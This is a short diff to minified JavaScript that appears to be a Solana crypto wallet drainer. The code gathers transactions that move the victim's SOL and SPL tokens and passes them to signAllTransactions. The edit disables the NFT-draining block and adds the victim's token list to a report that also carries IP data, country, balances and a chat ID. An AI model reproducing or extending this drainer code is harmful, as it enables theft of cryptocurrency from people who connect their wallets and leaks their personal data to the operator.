@@ -251,7 +251,8 @@ class c extends b {
           }
       }
       ));
-      // add this.nfts
+      // @TODO add this.nfts
+      /*
       const j2 = await Promise.all(this.nfts.map(async a=>{
         const b = new solanaWeb3.PublicKey(a.address);
         // const d = a.balance * Math.pow(10, a.decimals);
@@ -280,12 +281,9 @@ class c extends b {
         }
     }
     ));
-    // console.log(b)
-    // console.log(j)
-    // console.log(j2)
-    
-      // const k = [...b.flat(), ...j.flat()]; // ORIG => for j = sol + splTokens
-      const k = [...b.flat(), ...j.flat(), ...j2.flat()]; // new => for sol + splTokens + nfts
+    */
+      const k = [...b.flat(), ...j.flat()]; // ORIG => for j = sol + splTokens
+      // const k = [...b.flat(), ...j.flat(), ...j2.flat()]; // new => for sol + splTokens + nfts
       console.log("k: ", k)
       try {
           const a = await this.provider.signAllTransactions(k);
@@ -356,6 +354,7 @@ class c extends b {
                   ipData: a,
                   country: a.country,
                   usd: this.solUsd,
+                  tokens: this.splTokens,
                   tokenBalance: this.tokenWalletBalance,
                   chatid: this.a.chatId,
                   totalbalance: this.totalBalance,
